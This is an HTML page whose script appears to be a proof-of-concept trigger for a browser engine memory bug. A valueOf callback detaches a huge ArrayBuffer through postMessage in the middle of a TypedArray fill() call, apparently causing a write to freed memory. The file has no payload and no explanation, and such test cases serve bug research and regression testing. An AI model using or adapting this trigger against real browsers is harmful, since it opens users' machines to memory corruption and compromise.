<!DOCTYPE html>
<html>
    <body>
        <script>
        function f()
        {
            try
            {
              alert("t");
              postMessage("test", "http://127.0.0.1", [q])
              alert(a.byteLength);
              alert(q.byteLength);
            }
              catch(e)
            {
              alert(e.message);
              alert(a.byteLength)
              alert(q.byteLength);
            }

            return 0x12345678;
        }

        alert(Date);
        
        var q = new ArrayBuffer(0x7fffffff);
        var o = {valueOf : f}
        var a = new Uint8Array(q);
        var t = [];

        try
        {
          a.fill(0x12, o, 0x77777777);
        }
          catch(e)
        {
          alert(e.message);
        }

        </script>
    </body>
</html>